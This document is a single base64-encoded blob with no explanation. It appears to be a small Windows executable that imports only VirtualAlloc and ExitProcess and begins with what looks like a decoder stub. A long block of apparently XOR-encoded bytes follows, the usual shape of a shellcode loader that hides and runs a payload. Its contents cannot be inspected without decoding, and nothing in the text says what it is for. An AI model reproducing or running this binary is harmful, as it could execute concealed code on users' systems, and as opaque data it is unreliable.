AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMz/JcAPAAD/JbIPAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJZpAwAAAAAApmkDAAAAAAAAAAAAAAAAAEAwAAAAAAAAAAAAAHYwAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAABmMAAAAAAAAFgwAAAAAAAAAAAAAAAAAAAFAUV4aXRQcm9jZXNzAFgEVmlydHVhbEFsbG9jAABLRVJORUwzMi5kbGwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6ydbU1+wz/yudf1XWVNeigYwB0j/x0j/xmaBPwuidAeAPs916uvm/+Ho1P///xMOEREeBhcYBwMRBhEHEQMTEQYDERMfEBcTCQMRBxAGEhMbEhYGFwYHEBAGFhEdBhERERERERcRER8WEBYHERESFx4GJxITAyMTEREXFxsDEREaBhcHBBEbBBEREQYEAxEUExIRBxMTBBEiBxEDBgMWBwMRAxIWExMDBAYTEQQHExMTERETFwMREgcGGwQRAwYSIREnERYTHhEiESEQIRYRFBwGBhATCBELEQMREQMGBxETESIIIhQHAxMRERsTBxETExATECcGAwYhBCERERERECEZEREWEwQREwYWEhcGExETBxcDEwMREBYHERIRBxYSEwQRAxESGwYDEQYDERMjER4QFgYSBiMRBgQEBBMREBMRExAHERETBBMSIQcGFxMDJhMJERESIwMTEh4RFwQeBiwGERETAxUGEhYTEDQSERMXERMGERETEgMWEREbEREHExMXAxEbFwchBwQSAwMXERAQFQcREhYRIRIcEiMRER4SEhECEgYSERMQExIrBCERFwcTFAYDER4SEhkhHhQRERsOERMRExcHEiEEEhIZGRErBBQGEwYfBBMSFg8hDhYEEQMeEBMTEQYEEQMHIRISExsSEQcbEQcTERAQHBMDExMXBxMTHRETERwHFhIXBwQSGwMOEB4SEQYJBhEHERMRBAYDBBMSEQYDEwYXBBIHFAQSDhUHFhEWERcTEwYRBCcGFxEDBwcHAxMeByMEIREhExIDBgYiExEEERMRBhIGEQcTERERAxERExMUAwMTDBEXHAMHExMXFAMDAxEHIxERESMTEgEEERYDEhAQERsGEREcEAMGEREXIxIRExEREhMDEAcTFhwDFxERCwMHFhERESIOERISBhcHFwgXAxQREgcSERQREhsREQMSEwMRBhkQEQMRAx4RHAMRBhMGEQMRIRMREQYDERMQEQYTBAQTERcRExERESITERYRFBYTERMGz15UUENLTp79T4D9JlmE9fP7EQYDEUhXkdSoEQMR+MNOk9ArGxUGXo/fehRc6cEdBhERERERERcRER8WEP4HEREcCKQIJ6YazgKrEF3aNk9reGI6dmVoY2N6aTFycGhqbGU0cXcxdWZ9JHhMJ1VMVSN7aGd0LR8bGTcDBAYTEQQHdCn7+jJIkbsySYG+OF+Xu2MYRqkgSpCrextEqX5Lp650HkW+L0uVsDsoELszSoW+LTIGqRBTpKwkWJSp/kCVv08xdaguS6G+XSR7vANKl6lPMnmhM0qQq1Z4cG41SZG+ExETBxcDEwNBVRYHdZQUB6uu+VkRAxESGwYDEfYDMzMoExIQFiYQBiNdBwQEBBMR/HIQExAXERETBBOSIAcGFxMTJhMJExESJgMTEh4RFwQbBi4GERETAxWmERYTFDQS1BwTEREGMRATEhMWEREbEREXExMXAxEbFwcxBwQSAwMXARAQFQcREhYRIRIMEiMR0aoQEgkIEgbKrxEQpxIrBCERFwcTFAYDEW4REr04HhQRERsOERMRExeXESEMFBIZGRErBBQGEwYfBBMSFg8hDhYEEQMeEBMTEQYEEQMHIRLShxkSYQcbEQcTERAQHBMDEyMVByMVHRETERwHFhIXBwQSGwMOEB4SEQYJBhEHERM/cGN7cBMSEUMdEQYXFBIHFCQQDhUDFhEWERcTEwYRBCcGFxEjBwdnLWF6ZldlIRH1sRIDBjYgExGgERMRIhAGEQcTERERAxERExMUQwMTTD9zfXdmExMX9IYDAxHnIRERKSMTEskGERYDEhAQERsGEREcEEMGEdE5U3ZwZ3ARErcaEAcTZh8DFwsRCwMHFRERESIOERISBhcHFwhXAxRRPHV3fXtyEhsZFwMSE5MSBhkYEQMRGR0RHAMRBhMGEQMRIRMRUQYDUxMQEQYTBAQTERcRExERESITERYRFBYTERMGEw4RER4GFxgHAxEGEQcRAxMRBgMREx8QFxMJAxEHEAYSExsSFgYXBgcQEAYWER0GERERERERFxERHxYQFgcRERIXHgYnEhMDIxMRERcXGwMRERoGFwcEERsEERERBgQDERQTEhEHExMEESIHEQMGAxYHAxEDEhYTEwMEBhMRBAcTExMRERMXAxESBwYbBBEDBhIhEScRFhMeESIRIRAhFhEUHAYGEBMIEQsRAxERAwYHERMRIggiFAcDExERGxMHERMTEBMQJwYDBiEEIREREREQIRkRERYTBBETBhYSFwYTERMHFwMTAxEQFgcREhEHFhITBBEDERIbBgMRBgMREyMRHhAWBhIGIxEGBAQEExEQExETEAcRERMEExIhBwYXEwMmEwkRERIjAxMSHhFfjUIiJFFZkv8jXY3orE8QNBJZmM75CTYQEVuXw2IVWZZJEDTaqY8CERtWvyEXBBJHjl5R7wUDJhMSXpgkzRoRI1mU3h2WmAISBlqa2/jhESsEaZoawBUXBkKo4RISGWCTRRBdkM35Hj4SF0+ZLKoUERnxSAUFFE6YC70CEBLpz6iPFgURA1abFoAXBQSYuw8gEhJbkB+XARgR7w4WEBBUmA5pFRQH7AbRMRERVIwbfxEEBFqQ2+bZGxIRToILTwESEyLWR7sEkxIR+RabJhUEWozXTJlSMTdektIxSNDfyt3I68pfmsdPjl8LW5dvM0yoYTlbm3smCZURWY/LW5r/l8ZvQV9ygBECERFWINSI61Y/2CTORoLBbTRciEALX4o/UR6vLylTDrMSLcJnH1ju2Ufu0FWTwARYKsVf91Qo22UwWvzQSyjTYMWvEBELA0+dTTUZaoV9NgJOnHMzEF+IaDUyxCHR//be193dz97fz1mPRTQZS5hvOgFUimUiC1FZgP0BW5oMkwYSE5v7T5hUFFua7lmY2lia0vtU6e7rk9NkHo2QAhARHk6eHzTD+ghdjNeIxlmNzO6AdxEXE0GITSMgTpl/PypejWMiR1iTwjZO3srd3d3d3d3b3VmWSjQeT5hlNgdJTqT+M0uoJj8UFBdTiMtZkVcHT4/oU4/f+fH4+/yU1GYiqf0x1wWowls2fcFAHudfNo2bVReaQAiPUAWNRA+aGJhaAyTDmFkfwVgkkQMGEsodb5rFW5Xe3YdRESEWWZ9AIjZYmHw1M1mA1TFcxcvd393uxO7YT4jXWZhDG0+YewNYmmA/Top+AUV3WZL9IViqBLUVFRNAmuFPnUIHTpjoW4zcSpjqWJvm70Hs7viT0mYPmoAdExsGS5gB6DOYZzV2XJ3LXo3lmEIgLI9XNXBSmsVYjN6YVyAz7bJ/BxcTS61PLVFZmU8nW1qVZTNUVo1QIklZkMclR0zV39z43t3f291fjQQgFxEDWppNPylQjJEfFgMRVyzfVAFMmwIw19JcmUkjKVvps6ETHBLv3d3S3t5diQcHFhITUZiQJwUhEV8822EbSpgeWpkcyh0XEZqTHhATEVucQzYZjRqqGhkRa8dd+bGOHgQT3trD7cLayN3PVpsG0hIFBJqBCyASElsg2mQEKNHEW+6ygB0TA9/f28vf39HdX5rATp9JH06NYTtURpPycliN0U+cRAlamvVOiP5fmdNHuhYGFwRahN37WoXGTp9Sru4Crg4EEY/gTppFJzcsxEKrLgcjBGma7pD6BsBFJ/qYRxfsBJUPBBFPmEU1WUuaXTcjWI5PN1hQr1wDBxPsAmQeAQNVjGc1RVmoRzZJTJpaJyI7512WSjVpn/4GwBb4nlQT7gZaDBATT5tDN15UiEM1IUOAzunuBA4/DBFen1ozZ16DTBNdmmEvW5r3TtHX3d3P3t/P3cpRmU0nGUuXfTgTWY9nIglUUHVSRFBQQkZbk/0mX4/tW5waVzETEe43AwwUEVydy1mWxhyKVRAeBl+VEj4zBBFPmsvsBLIfExNXnQJWKwERT5vNWpjj7QOnCwQHWJ0TXDMfBlma2lma4egEnwMUEF6KBFYwFR5OrNlbiMvsBGoLFRtLnAReJBUHTJrQSJrh7hNsHxMUW58ERjERBFmpzF2I/vwDUh8TA1ubji8CBAZfnAkY7ezsWZrEXojcXozFV4/x63Ts3u5umIubHxEiWKyNPxcRFFCLC63v9+5HmsBZmtVPjNz7Xtz33V2OnmMQERtaiow7EhATXKoLGfve+22a0lmaxWiS3Pk67fvuWo+LahYGE1iemiUCEwNdnRuE7O3uS53RWo/HSprf8w/97vlKmI6jEB4QX4uPEiIRBkiJCfvq7+xdmNNOmsZaj976x/r56FqKu3sIERFbrp5VEx4RW4kTq9H57l2YwFyNxl+Y3dzR7OzoWJqbgRATEkudTTVLWZprN0tfiGU/d0+iwyRTXEJJUE1RSVjS3trd7d7Q3muYTToaRVmB/maZy1qb61qmUAUhnMxSrDYDER7tB3s6HBRZmk8qWVuaXzM3XqxINkZYoVErBBT5BjkEBhOZxUesijKMEQMeWJDY7ke9FAMHIV6Z1FOZ2k+SVSMz7gU6BxEDV5hTI0dblkU3WVSMWjYnS4leP3vxBR4JEwZFjVUjWVuaUCIzTJjZ7hPWCQQXTJlbMHRajdFnSdLa3dvf38pZj+NOnkkLT45vE1uXdztMqGkBUkdCUEd1W5LoMV+a71qLHHozExHuFtYLERNYiPtbidEYmNkHExNfmRb/HBMHa5rZ7jZgCAMEWZsWFjASEVKN3lmXyPwTcQsVI1qcBhgxEBNKm8hbneT8AlwLCQNPmwQXMSAOWJndTpz36B0tGRYRWooHEjQTElKa3kuZ+/wEIQMSEUucFh4xHgNYjdxKmvPuNAcLEwZOnJYsEAYTj9damtpdmOn5tdzs7luckQgSERONxEea3PaV6ef4TpyDOQYRA5jHT4jc+53u6OxEjpQ1EQYSmM5bncv/d/nv70ublAkHERFQmsdYnNz5QOjv6UqclFQWHgZmmcRKqN75XOno5EuaTT5GX4xoNVNMmmU1VkyIbTBLWpLDM1JbUHxGTMDKz9rLz91Lm0o3C1ZSUVJHRVBbkP8hmoIfAhEST43iulEDBhKqUxusFiMeEWaa7xPjUprRl1ZWWJhAIYDJ/ARGGgQHVCDnq48uFQcDltFkDJhUQVeY3leb4jXK+TQ9OBMRmJYcIBkRmlVDTJweBwkQF4+UARIHF/wGVggSFk+cB+cZFBJbj9n8BO8DBANYhczuW6bRajWdiR4HIxFDiUsGX5xUN3FbmUs1eZhPQ1qsUyJ/mk8Cc0Ca3u3zR5hZSlWcgxYHLAaahh8CFQZbndxcvWY1M+gE8x4TERylQAJQmvV3VTxgFWQ8WZZkK2kE9JmECxYREFSeAZpE7lWqXOBeINGamR4TEQJbjd1ZEMBfm18gAe4CpgsWBgymXRTt3GmTYjkq83LZW5pPM3daosAiU0ZYT3RaScXfyleNTzYeWGmN+iRZiMf4kRsRBoVqC+c8OBiY42YhhmAZ96azRmQCkngb7Rk1+WYVItruCXYOEBeMw1qQXyogVpHVJlbFIs7uBkUcBAPIINvuE1gLBBfI3stcjU4qHU+ffTIBX5pnIjFTZlJWREJRRlBLkPJHb4/AWarZWoj87kRwEQRdmDzx7wQRvYMQEBFLmt4gyFEw/F+H4f/qagcTqQwUAQNLmshrmuH5XXkSAY/5XobkZRqqTAYREfX5AwYRuRMsl4kTERFenkc0N6kMHAcXWZrE6yx/ERGU4nvJqIMHFgdfg9jrvngSB1qa5FmX22XSQ+TWAmRDkkQ1M1mIUjUk62slEgZZiOlpltFkEUeaVzQhTphQICtZnN/74eTu3Vua7voSV6wQEwYTRprWVvHPA9z0wofylxUDE/oaR5pXOyBfmF0nKU+bzvp2RxIWTpy6I5AQBhaaxYPKZFr6GVmcrTWfFhAWT5TuZw5WjentBhA0ERFZnO9ThtFkEvkCMhMTG4/JUefDBncMXJbtZR9emMpcqcNQiNFLnchPmG82NvspAwQGmMlJguVnHlya1V6IxZnM7glvEQNKn301Z5rVWpVKEliqexlfmmdUT43zUldQVVBeUE1cxcvd393uxGqdWycbWZh3NxdZmmc0C0dmUEJRaYfNMVma4K0vGRERW5j1nF5EX5nvQpjr+7AxAhNLmshegtEdlaQXEhNAnEZTIclOiNnuFjwSI1mXI16LByU/EwZMj8pWlO9nQvseJxARW48YWqwSIgsRA26aShn56TwCE1qVGl+JCy8wBBFZmkAF7voJEhB8mRpbmgQ9GhMRW5tADvnEBBART5gYX44EMAsFIU+NUSPr1Q4REP5R7gesBCMSVJkoWZwLwgkTAlqPURnsBbUHKQRpmhxPngHSGBMeWptaMeEBgwQZDlmYGluaEso6BhJakFoJ1BFqExEGV48YWpsa9RUUBFmKXTDsBnsTBhFLjmI6WpbkZhtPkBRN6BMQWJUUS5hAH0+WwWl6W5pYI3ZanMhMm1g78cJWmRxv8gQRjPlbmE82hsRmVlmFeDMGYxxajG88+QNdjBnuRTFfmKy+EQQnTpLudulPjEALVoLjcCpZrFhSuRYGIhPu1FmYHNvoBBFPmML5uF4REfgbXIjI+xc0FhxOguVnWVyIeDP6RW+aFqsiExMBTZrY6wZyEBFTjRS45hIDTpoh/DlamlUBWSnQdx5PmEY8S5LDZQ5LjBnuw1mpOFmX5HP2T5y3rwMUEVo8aSlhqVqQTTVDWph3NVaS1VmIfSdWWZ/HMUdMR09c0u3f3d3Kz93f3FmN10yNSxlfmHsBWZhSC1mfaTRXRVmQ6jNGmhQq/BUYRojhTprtWYgLXY3yWZbEZD1bgngBTpvQWp5UUv5dOgcHldBzEVmeeTkRZBRZmgz6ypTAWJ3K7kY6/Bu+txYTA2uYTTUnX5BvNSlSjWMjRFmQeDVZWYXAI1BK0N7dy9/fyN3uy1mKWiceT4plJwJBW5DvJE6Y4EyM2VuYy/lwSAMRqMoHHwRZiM1aqunP3nATHlmn0VUFaZ1fPF2+FhATCFmAwUoS2esXIhATWaf3VhlLiNRZms0gzvkYexATWKxaJzZpj1U1KSLRWKLdMU7V38jd38ra3tvKW5hPIx9UW4D9MF6M6Fqazf7lTQQRS5rKU4PDZS5PmlQLq9AREgZTvzMRBgRNh9MxWJjZ+9hkERFfj9BaqtA13vuoQRMJItFaqF83IlaS0yRBxeDK3d3fz12PTjIbWL1mNQNAWZDqMVmY4Eud6KvVEBUHW5jZMMrzG2EhB0yXw3cBWZtfPUOcUQZZqsJUkeIx+VE2ExHpF72yERMQV5noTKrHX4zc/HhrER5amUUFLlyaZT82ItNZkNMnTeLI3t7V1d3nyFyPTyIXTJpmMh92RpfocQceEFuY6E6P2+ssfxISIO1amt9TlMcclcAQHBNLnl8zR6kXHBET7gniBBAXgsQdn6gOEB6fR1pBi10jUdSVIIYHBBMWEAYD++s8BRKOYCAqRpxzMiFanJs3mwIRBG+LWzVDQjTHMMFWjlcgCXeoYxBLj3IGM+4RjwETBlqLhSOTFRERS5ydN0MWAwPsGeEEHgOMnzefEAMDT5yDB0ETESMcpcBImFInItH5AaECEBEcmUciOZhbBzJZnl01Ul+OHUoLFBxHmlPu4wckFxFdnGYqUajeBxYHX4Pc60JOEgdemtdZmcwi2OsjdQMRSpSMNWMVAx4i3EqaXQNPmnAJaJjyTsXP3VuZTSIbTI1nNQdGW5L9IWqY4F6a3l6Y6/sRTg4RWZXeX53Hdy28GwcQA1uayUuYVzsw/7pqAxFPmwtU5BkSWotTIidYnRMYEB0GWZhVNTn5L0oRH1qb1U+axyHe9rFCEhNLqE81UV+cbydZItpOlMM0TtjI3d3dysjP3dhbkf0v+wxTESJPnA7WvBQHS5gG4+ARE0uHwjv4uGoTE9/d3d/bz93eT49HIBlUTpHNMW+a7/gIWalSMVik1mURVI3J78NAmsD5CDAQA06MHKfnIAjKG10DE1maw1uC0WbFWJ4dX7kBBsm3TBERWZodte8TEV6YWDUjTpXWN1n65EUHF8/fz93c2svd3lmOSjYbU1mA/TJTjVoBT4jpW6jTnSsXcxtH5BGZFwQE+AlYmEpzqqgQEBNMmNrJ1mQXE0uvUDGSNhKbAhMSHlmcWDo2ZIXVMUzA2cre2t/cfJtNNx9ZmnI1AURagPoxWZDLWYziW5LKZUtfhBgHcFhLhsVlVViYTVGSLxFVLlSZdRlZm8BmIuoqLxMRltBmOGOPWiH8EF+fAUuaEKgYGSAe/CtMGw5ZmK6rFwcSaT9pKmz6qSoEFAb4BCzEW5lKKxFGnXA1O1aT1zNOxe3uKQYh3t7f197dy1OYWzcZRkddRUuS/1cFExNVmuIi40+fbjM3RJpnJ06r4RIRBk2N0jTDW5xIIkLsajQQBkObujNEEwcUQJnNJtVenJo1VhITBvlbAQcXmL8jdwUDE/bMVQQhWRguXvYEBlccIs3uBhMWEAZZjhYq5BMDItj7kz4CA1uH2f+QKgYTg/+idwMDXYzTWZhVByP60HMRFkuZyFiU23MfnFQY/BPRHhUj+0cRERFamnM4jFUalYCfEREL60JrERGa6oeSghIGFwRZBJ6ImBESB5utMHkQGxFZjkQjT5yCPXgTAxFLldr0QhsGE4PRdhaYsxERBui9W5taFluPRQNZktFnFFmaNOzBXpwR6xsRE06aTWlZkwPREQcDWY+ShxEDE1mLBmkZHxBfmkoLWIxWDlqaWCr+Yer5+JuEIn4THQZZktMhWRLBWZrU/jEeBxFZn2ReSqzcqfwiHBFQrxYbAxFZkU0v+BG8FgYRlNFzE/wEzx0QEU+Y20ia5L3uAgkD6RKZHAESXpjY68JxExGBx2cZqhsRExfqF+34+VOPF0uPUWn5HxYWE5dScphiRN4DVQUeBk6b20CYdzUjUKgDBwcRX5xmLGKqBQMTEZrN7BI9AhEQW51rIkPuXy0gEVmYUkhplF01Vvt0OBIGXptUZuwEeQkVA5jL7gUcFhMSWYzeWpp4NSNQqxsHAxFKjpU3YxAeEJ3Q7RPHAQQETImfNVASERP4NDgQE0yaUUlPi5s3QycTCfkzOyIDW5tdYf/FZQYsj5KBEwMVTpldA1ix2x6XghETBlmaUjpLk9FlD+7BgtNmGUuaWAdPqk98WopIB/rGWJ5EAVudx2mZ1+1zUZruWplaElqNUyFbldNmKfvxWZxMA1yNQjFWl9JtMJviZBhTN2oLnEUWcxCq0+3CnO9kOEyfRQtOmsRnPV6GYh5ejWob9RxbmFIWTJpLf2mbWQOQWTGC0mUP+9tqEByaeDNbnMz7jJ8RE/qaT51BB0+P2VOG3GQZ+vUBCQb66vnW6vv564xlEhHuDHgGF0yZzPzvZw4V7AdZnV0zI/t5ZQQnjas1cwUHB4jUVoy/IEETIRNagsJGIBMRRU9MT8Xeyt3L391Zmgc10t/f2M/P38BRRElVUFJHVkFCVUJGT6D9OSLOV5nsQJrzS5u8NJEbBhFVl+WI81mYewdiVZjs+dPs/O9DnlsdS5zJqUZZBxZ3KBJXFFlxQTpfil3IX4LtrhEHEmYdkC4BQVQDEmcGWC3A+8ZmWYgaNHwDEQZbj40nmSETEVmNSwlbm2gmW414N2lflOwelRIgExGtFRQWE1Cp+ewOEVmVUUdcCLRWTlmM3MLaHIY5cGEVH6ERiusxT4jtERytEF4F308EwXZDFdNo2ZDoSq1bexiUzh8WEF6MRjEdoO292O0TA2twUy2cuwuLEREaQpxTETFfj00ENUoH0V0XyVcizlKefRNnjBNCjcpaBMFQiRLX2h4MusZa7sQE21KZEZXTYu2Q64lIFehlG4fri+0qbWIDn+h2246BVR6Q7e408B5mXJpPBB9UHrQFS5wfE6PxrFoJ72YYVpA/hl0Q+fsikd6s/wtdcShWmjWQXCL7+jGX6lDbvJdjG1CNJ5BfBOXoHILo4iTxH2cWQJ0ukkgS+XcR6EMw2E+A0xdvEsF2k/Adg33u+ftIjbc1kBMREyPq+IUTBBOT2Fpu7S8Mo7EJERFeqEQzU6IQFwQevdP5ERFaYFU6Uxmk5HWfbTcWV5iaEZkTEgNRml